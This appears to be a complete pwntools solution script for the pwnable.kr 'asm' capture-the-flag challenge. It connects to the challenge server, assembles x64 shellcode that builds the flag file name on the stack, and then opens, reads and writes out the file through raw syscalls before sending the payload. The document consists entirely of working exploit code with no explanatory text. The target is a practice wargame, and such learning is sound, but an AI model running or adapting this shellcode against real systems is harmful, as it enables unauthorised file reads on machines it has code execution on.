from pwn import *


def main():
    context(arch = 'amd64', os='linux')
    p = remote('pwnable.kr', 9026)
    shellcode = asm(""" 
        mov rbx, 0x5F73695F73696874
        mov rcx, 0x5F0BFAF042FA3805
        sub rbx, rcx  
        push rbx
        mov rbx, 0x306F306F306F306F
        push rbx
        mov rbx, 0x3030303030303030
        push rbx
        mov rbx, 0x303030306F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F3030303030
        push rbx
        mov rbx, 0x3030303030303030 
        push rbx
        mov rbx, 0x3030303030303030
        push rbx
        mov rbx, 0x303030306F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6F6F6F6F6F6F6F6F
        push rbx
        mov rbx, 0x6C5F797265765F73
        push rbx
        mov rbx, 0x695F656D616E5F65
        push rbx
        mov rbx, 0x6C69665F6568745F
        push rbx
        mov rbx, 0x7972726F732E656C
        push rbx
        mov rbx, 0x69665F736968745F
        push rbx
        mov rbx, 0x646165725F657361
        push rbx
        mov rbx, 0x656C705F656C6966
        push rbx
        mov rbx, 0x5F67616C665F726B
        push rbx
        mov rbx, 0x2E656C62616E7770
        push rbx
        mov rbx, 0x5F73695F73696874
        push rbx
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        xor rax, rax
        mov al, 0x2
        syscall
        
        xor rbx, rbx
        mov bl, al
        xor rdi, rdi
        mov dil, bl
        mov rsi, rsp
        xor rdx, rdx
        mov dl, 0x40
        xor rax, rax
        syscall
        
        mov dil, 0x1 
        mov al, 0x1 
        syscall
        
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall
    """)
    # print(shellcode.encode('hex'))
    print(''.join(format(x, '02x') for x in shellcode))
    p.recvuntil("give me your x64 shellcode:")
    p.send(shellcode)
    p.interactive()
    p.close()


if __name__ == "__main__":
    main()